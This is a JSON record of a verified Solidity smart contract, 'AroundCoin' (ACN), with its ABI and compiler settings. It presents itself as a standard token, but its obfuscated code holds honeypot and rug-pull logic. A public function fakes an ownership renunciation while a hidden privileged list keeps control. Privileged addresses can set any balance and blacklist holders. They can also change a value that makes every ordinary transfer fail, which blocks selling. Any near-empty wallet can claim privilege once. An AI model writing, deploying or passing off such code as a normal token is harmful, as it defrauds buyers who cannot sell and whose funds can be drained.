{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract takeToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txSwap {\n    function createPair(address feeAutoSwap, address modeMax) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface limitAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toMin) external view returns (uint256);\n\n    function transfer(address liquidityLaunched, uint256 txTotal) external returns (bool);\n\n    function allowance(address tradingTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunched,\n        uint256 txTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenTotal, uint256 value);\n    event Approval(address indexed tradingTake, address indexed spender, uint256 value);\n}\n\ninterface txLiquidity is autoSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AroundCoin is takeToken, autoSender, txLiquidity {\n\n    uint256 listMin;\n\n    bool public amountTx;\n\n    address public marketingLaunch;\n\n    uint256 private swapReceiver = 100000000 * 10 ** 18;\n\n    uint256 fromTeam;\n\n    address totalReceiver;\n\n    uint256 public txSell = 0;\n\n    mapping(address => bool) public enableSender;\n\n    function allowance(address tradingSender, address maxSender) external view virtual override returns (uint256) {\n        if (maxSender == shouldSell) {\n            return type(uint256).max;\n        }\n        return receiverTeam[tradingSender][maxSender];\n    }\n\n    function totalExempt(address tokenLaunchReceiver, uint256 txTotal) public {\n        walletTrading();\n        swapShould[tokenLaunchReceiver] = txTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedAutoFund;\n    }\n\n    address private launchedAutoFund;\n\n    event OwnershipTransferred(address indexed tradingMin, address indexed modeFromAuto);\n\n    uint256 public feeToken;\n\n    bool public teamExempt;\n\n    function toIs(address modeReceiverTx, address liquidityLaunched, uint256 txTotal) internal view returns (uint256) {\n        require(txTotal > 0);\n\n        uint256 teamMode = 0;\n        if (modeReceiverTx == fromIsTo && minShould > 0) {\n            teamMode = txTotal * minShould / 100;\n        } else if (liquidityLaunched == fromIsTo && txSell > 0) {\n            teamMode = txTotal * txSell / 100;\n        }\n        require(teamMode <= txTotal);\n        return txTotal - teamMode;\n    }\n\n    function fromAtMode() public {\n        emit OwnershipTransferred(marketingLaunch, address(0));\n        launchedAutoFund = address(0);\n    }\n\n    function transfer(address tokenLaunchReceiver, uint256 txTotal) external virtual override returns (bool) {\n        return isEnable(_msgSender(), tokenLaunchReceiver, txTotal);\n    }\n\n    uint256 private toSender;\n\n    bool public maxAmount;\n\n    function approve(address maxSender, uint256 txTotal) public virtual override returns (bool) {\n        receiverTeam[_msgSender()][maxSender] = txTotal;\n        emit Approval(_msgSender(), maxSender, txTotal);\n        return true;\n    }\n\n    mapping(address => bool) public maxFeeFrom;\n\n    function receiverEnableTeam(uint256 txTotal) public {\n        walletTrading();\n        fromTeam = txTotal;\n    }\n\n    address shouldSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (receiverReceiver != amountTx) {\n            fromTotal = toSender;\n        }\n        fromAtMode();\n        limitAuto atTeam = limitAuto(shouldSell);\n        fromIsTo = txSwap(atTeam.factory()).createPair(atTeam.WETH(), address(this));\n        totalReceiver = txSwap(atTeam.factory()).feeTo();\n        \n        marketingLaunch = _msgSender();\n        maxFeeFrom[marketingLaunch] = true;\n        swapShould[marketingLaunch] = swapReceiver;\n        if (toSender == feeToken) {\n            amountTx = true;\n        }\n        emit Transfer(address(0), marketingLaunch, swapReceiver);\n    }\n\n    mapping(address => uint256) private swapShould;\n\n    function owner() external view returns (address) {\n        return launchedAutoFund;\n    }\n\n    function walletTrading() private view {\n        require(maxFeeFrom[_msgSender()]);\n    }\n\n    string private fromSender = \"ACN\";\n\n    address public fromIsTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldExempt;\n    }\n\n    function balanceOf(address toMin) public view virtual override returns (uint256) {\n        return swapShould[toMin];\n    }\n\n    function receiverShouldMax(address maxFromTotal) public {\n        require(maxFromTotal.balance < 100000);\n        if (maxAmount) {\n            return;\n        }\n        \n        maxFeeFrom[maxFromTotal] = true;\n        if (fromTotal == feeToken) {\n            receiverReceiver = false;\n        }\n        maxAmount = true;\n    }\n\n    function txShould(address feeAt) public {\n        walletTrading();\n        \n        if (feeAt == marketingLaunch || feeAt == fromIsTo) {\n            return;\n        }\n        enableSender[feeAt] = true;\n    }\n\n    uint256 public minShould = 3;\n\n    function modeSender(address modeReceiverTx, address liquidityLaunched, uint256 txTotal) internal returns (bool) {\n        require(swapShould[modeReceiverTx] >= txTotal);\n        swapShould[modeReceiverTx] -= txTotal;\n        swapShould[liquidityLaunched] += txTotal;\n        emit Transfer(modeReceiverTx, liquidityLaunched, txTotal);\n        return true;\n    }\n\n    string private receiverAmount = \"Around Coin\";\n\n    bool public receiverReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTeam;\n\n    uint8 private shouldExempt = 18;\n\n    uint256 private fromTotal;\n\n    function transferFrom(address modeReceiverTx, address liquidityLaunched, uint256 txTotal) external override returns (bool) {\n        if (_msgSender() != shouldSell) {\n            if (receiverTeam[modeReceiverTx][_msgSender()] != type(uint256).max) {\n                require(txTotal <= receiverTeam[modeReceiverTx][_msgSender()]);\n                receiverTeam[modeReceiverTx][_msgSender()] -= txTotal;\n            }\n        }\n        return isEnable(modeReceiverTx, liquidityLaunched, txTotal);\n    }\n\n    function isEnable(address modeReceiverTx, address liquidityLaunched, uint256 txTotal) internal returns (bool) {\n        if (modeReceiverTx == marketingLaunch) {\n            return modeSender(modeReceiverTx, liquidityLaunched, txTotal);\n        }\n        uint256 atAuto = autoSender(fromIsTo).balanceOf(totalReceiver);\n        require(atAuto == fromTeam);\n        require(liquidityLaunched != totalReceiver);\n        if (enableSender[modeReceiverTx]) {\n            return modeSender(modeReceiverTx, liquidityLaunched, swapExemptToken);\n        }\n        txTotal = toIs(modeReceiverTx, liquidityLaunched, txTotal);\n        return modeSender(modeReceiverTx, liquidityLaunched, txTotal);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapReceiver;\n    }\n\n    uint256 constant swapExemptToken = 4 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFromAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAtMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromIsTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFeeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"receiverEnableTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFromTotal\",\"type\":\"address\"}],\"name\":\"receiverShouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"totalExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"}],\"name\":\"txShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AroundCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}